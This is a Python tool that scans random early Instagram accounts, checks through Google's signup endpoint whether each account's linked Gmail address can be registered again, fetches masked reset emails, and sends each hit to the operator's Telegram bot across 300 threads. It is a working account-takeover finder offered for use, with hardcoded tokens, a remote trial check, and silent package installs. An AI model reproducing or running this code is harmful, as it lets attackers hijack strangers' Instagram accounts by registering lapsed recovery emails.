_V='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
_U='ig_sig_key_version'
_T='signed_body'
_S='application/x-www-form-urlencoded'
_R='mid=ZVfGvgABAAGoQqa7AY3kgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
_Q='Cookie'
_P='tl.txt'
_O='https://accounts.google.com'
_N='en-US,en;q=0.9'
_M='accounts.google.com'
_L='referer'
_K='origin'
_J='authority'
_I='@gmail.com'
_H='__Host-GAPS'
_G='application/x-www-form-urlencoded;charset=UTF-8'
_F='*/*'
_E='google-accounts-xsrf'
_D='accept-language'
_C='accept'
_B='User-Agent'
_A='Content-Type'
print('Этот инструмент предоставляет только аккаунты Instagram 2012-13 годов')
print('Я не связан с разработчиком, но пользуйтесь с удовольствием')
import os,sys,re,json,string,random,hashlib,uuid,time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice,randrange
from cfonts import render,say
from colorama import Fore,Style,init
import webbrowser as w
w.open('https://t.me/+Ubj_lu-pz9k1ZGFl')
import time
from datetime import datetime
import requests
from datetime import datetime
import requests
from datetime import datetime
def check_expiry():
    expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiryuser.txt"
    try:
        response = requests.get(expiry_url, timeout=5)
        response.raise_for_status()
        expiry_str = response.text.strip()
        expiry_datetime = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry_datetime:
            print(f"{Fore.RED}THIS TOOL TRIAL IS ENDED NOW DM @BOLORADHEY FOR RENEWAL")
            exit(1)
        else:
            print(f"{Fore.GREEN}WELCOME TO THE TOOL !! 🦚")
    except requests.exceptions.RequestException as e:
        print(f"⚠Failed to check expiry (using offline fallback): {e}")
check_expiry()
init(autoreset=True)
всего_находок=0
находки=0
плохие_инста=0
плохие_почты=0
хорошие_инста=0
инфо_инста={}
import os,random
try:from cfonts import render
except:os.system('pip install python-cfonts');from cfonts import render
try:from colorama import Fore,Style
except:os.system('pip install colorama');from colorama import Fore,Style
def random_color():return random.choice(['magenta','cyan','yellow','red','blue','green'])
def slow_print(text,delay=.05):
	for A in text:print(A,end='',flush=True);time.sleep(delay)
	print()
def show_banner():A=render('RADHEY',font='block',colors=[random_color()],align='left',space=False);print(A)
def show_credits():
	credits=f"\n{Fore.CYAN}Telegram: @BOLORADHEY\n{Fore.CYAN}Channel: @SUNRADHEY{Style.RESET_ALL}\n"
	for A in credits.split('\n'):print(' '*40+A)
def print_slowly(text,delay=.01):
	for A in text.split('\n'):slow_print(A,delay)
os.system('clear'if os.name=='posix'else'cls')
show_banner()
show_credits()
ID=input('ID : ')
ТОКЕН=input('ТОКЕН : ')
os.system('clear')
def обновить_статистику():A=f"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢛⡛⠿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠟⡉⣡⡖⠘⢗⣀⣀⡀⢢⣐⣤⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠉⣠⣲⣾⡭⣀⢟⣩⣶⣶⡦⠈⣿⣿⣿⣷⣖⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡛⢀⠚⢩⠍⠀⠀⠡⠾⠿⣋⡥⠀⣤⠈⢷⠹⣿⣎⢳⣶⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⡤⠉⠀⠀⠀⣴⠆⠠⠾⠋⠁⣼⡿⢰⣸⣇⢿⣿⡎⣿⡷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠀⢸⢧⠁⠀⠀⢸⠇⢐⣂⣠⡴⠶⣮⢡⣿⢃⡟⡘⣿⣿⢸⣷⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣯⢀⡏⡾⢠⣿⣶⠏⣦⢀⠈⠉⡙⢻⡏⣾⡏⣼⠇⢳⣿⡇⣼⡿⡁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠈⡇⡇⡘⢏⡃⠀⢿⣶⣾⣷⣿⣿⣿⡘⡸⠇⠌⣾⢏⡼⣿⠇⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⠀⢇⠃⢢⡙⣜⣾⣿⣿⣿⣿⣿⣿⣧⣦⣄⡚⣡⡾⣣⠏⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⡀⡀⠃⠸⣧⠘⢿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⠃⠘⠁⢈⣤⡀⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣅⠀⠀⠸⠀⣦⡙⢿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⢛⣉⣉⣀⡀⠀⢸⣿⣿⣷⣬⣛⠛⢛⣩⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⢋⣴⣿⣿⣿⣿⣿⣦⣬⣛⣻⠿⢿⣿⡇⠈⠙⢛⣛⣩⣭⣭⣝⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⣼⣿⣿⣿⣿⣿⡿⡹⢿⣿⣽⣭⣭⣭⣄⣙⠻⢿⣿⡿⣝⣛⣛⡻⢆⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢥⣿⣿⣿⣿⣿⣿⢇⣴⣿⣿⣿⣿⣿⡿⣿⣿⣿⣷⣌⢻⣿⣿⣿⣿⣿⣷⣶⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿
⡆⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣿⣿⣿⣄⣸⣿⣿⣿⣿⣦⢻⣿⣿⣿⣿⣿⣿⣿⠁⠊⠻⣿⣿⣿⣿⣿⣿⣿
⣿⠸⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣷⣿⠀⣿⣿⣿⣿⣿⣿⣿
⣿⣄⢻⣿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠈⣿⣿⣿⣿⣷⢙⠿⣿⣿⣿⣿⣿⣿⣿⠿⣟⣩⣴⣷⣌⠻⣿⣿⣿⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣆⢻⣿⣿⣿⣿⡇⣷⣶⣭⣭⣭⣵⣶⣾⣿⣿⣿⣿⣿⣿⣷⣌⠹⢿⣿⡿⢋⣠⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡚⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⢻⣿⣿⣿⡇⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⠈⣿⣿⣿⣿⢆⠀⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣤⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⣻⣿⣿⣿⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣒⣻⣿⣿⢏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⢹⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣷⣬⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠻⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⢎⢻⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣾⣦⢻⣿⣿
⣿⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣆⢻⣿
⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⣿⣆⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⣿⣿⣿⣿⣿⡌
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⡆⢿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⢸⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⣿⣿⣿⣿⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢹⠸⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸
⣿⣿⣿⣿⣿⡌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢰⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢰
⣿⣿⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢰⣿
━━━━━━━━━━━━━━━━━
[38;5;120mНаходки[38;5;150m : {находки}[38;5;204m |[1;31m Плохие IG[38;5;231m : [38;5;204m{плохие_инста}[38;5;231m | [1;31mПлохие почты[1;37m : [38;5;204m{плохие_почты}[1;31m | [38;5;231mХорошие IG[1;31m : [38;5;204m{хорошие_инста}
━━━━━━━━━━━━━━━━""";sys.stdout.write(A);sys.stdout.flush()
def получить_токен():
	try:
		A='azertyuiopmlkjhgfdsqwxcvbn';C=''.join(choice(A)for B in range(randrange(6,9)));D=''.join(choice(A)for B in range(randrange(3,9)));B=''.join(choice(A)for B in range(randrange(15,30)));F={_C:_F,_D:'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',_A:_G,_E:'1',_B:str(generate_user_agent())};G='https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB';H=requests.get(G,headers=F);I=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',H.text).group(2);J={_H:B};K={_J:_M,_C:_F,_D:_N,_A:_G,_E:'1',_K:_O,_L:'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',_B:generate_user_agent()};L={'f.req':f'["{I}","{C}","{D}","{C}","{D}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};E=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=J,headers=K,data=L);M=str(E.text).split('",null,"')[1].split('"')[0];B=E.cookies.get_dict()[_H]
		with open(_P,'w')as N:N.write(f"{M}//{B}\n")
	except Exception as O:print(O);получить_токен()
получить_токен()
def проверить_gmail(почта):
	C='@';A=почта;global плохие_почты,находки
	try:
		if C in A:A=A.split(C)[0]
		with open(_P,'r')as D:E=D.read().splitlines()[0]
		B,F=E.split('//');G={_H:F};H={_J:_M,_C:_F,_D:_N,_A:_G,_E:'1',_K:_O,_L:f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={B}",_B:generate_user_agent()};I={'TL':B};J=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{B}%22%2C%22{A}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";K=pp('https://accounts.google.com/_/signup/usernameavailability',params=I,cookies=G,headers=H,data=J)
		if'"gf.uar",1'in K.text:находки+=1;обновить_статистику();L=A+_I;M,N=L.split(C);информация_аккаунта(M,N)
		else:плохие_почты+=1;обновить_статистику()
	except Exception:pass
def проверить_инстаграм(почта):
	A=почта;global хорошие_инста,плохие_инста;C=generate_user_agent();D='android-';E=D+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];B=str(uuid.uuid4());F={_B:C,_Q:_R,_A:_S};G={_T:'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid':B,'guid':B,'device_id':E,'query':A}),_U:'4'};H=requests.post(_V,headers=F,data=G).text
	if A in H:
		if _I in A:проверить_gmail(A)
		хорошие_инста+=1;обновить_статистику()
	else:плохие_инста+=1;обновить_статистику()
def получить_ссылку_сброса(пользователь):
	B='Ссылка отсутствует'
	try:C={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427',_B:'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US',_Q:_R,_A:_S,'Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};D={_T:'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+пользователь+'"}',_U:'4'};E=requests.post(_V,headers=C,data=D).json();A=E.get('email',B)
	except:A=B
	return A
def определить_год(id):
	try:
		A=[(17750000, 2011),(279760000,2012),(900990000,2013)]
		for(B,C)in A:
			if id<=B:return C
		return 2014
	except Exception:pass
def информация_аккаунта(имя_пользователя,домен):
	B=имя_пользователя;global всего_находок;A=инфо_инста.get(B,{});I=A.get('pk');J=A.get('full_name');D=A.get('follower_count');E=A.get('following_count');F=A.get('media_count');G=A.get('biography');всего_находок+=1;C=f"""
𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗙𝗢𝗨𝗡𝗗 ━ 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠
🔗 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗟𝗶𝗻𝗸: (https://www.instagram.com/{B})  
📊 𝗦𝗧𝗔𝗧𝗦:
▸ 𝗧𝗼𝘁𝗮𝗹 𝗙𝗶𝗻𝗱𝘀 » {всего_находок}  
▸ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » @{B}  
▸ 𝗘𝗺𝗮𝗶𝗹 » {B}@{домен}  
▸ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 » {D}  
▸ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 » {E}  
▸ 𝗣𝗼𝘀𝘁𝘀 » {F}  
▸ 𝗖𝗿𝗲𝗮𝘁𝗶𝗼𝗻 𝗬𝗲𝗮𝗿 » {определить_год}  
📝 𝗕𝗜𝗢:
✦ {G}
🔄 𝗥𝗲𝘀𝗲𝘁 𝗟𝗶𝗻𝗸: {получить_ссылку_сброса(B)}
💻 𝗗𝗲𝘃𝘀:
▸ @sayrolex | @sunradhey   
"""
	with open('rdh.txt','a')as H:H.write(C+'\n')
	try:requests.get(f"https://api.telegram.org/bot{ТОКЕН}/sendMessage?chat_id={ID}&text={C}")
	except Exception:pass
def основной_цикл():
	D='lsd'
	while True:
		B={D:''.join(random.choices(string.ascii_letters+string.digits,k=32)),'variables':json.dumps({'id':int(random.randrange(17750000,900990000)),'render_surface':'PROFILE'}),'doc_id':'25618261841150840'};E={'X-FB-LSD':B[D]}
		try:
			F=requests.post('https://www.instagram.com/api/graphql',headers=E,data=B);C=F.json().get('data',{}).get('user',{});A=C.get('username')
			if A:
				инфо_инста[A]=C;G=[A+_I]
				for H in G:проверить_инстаграм(H)
		except Exception:pass
for _ in range(300):Thread(target=основной_цикл).start()
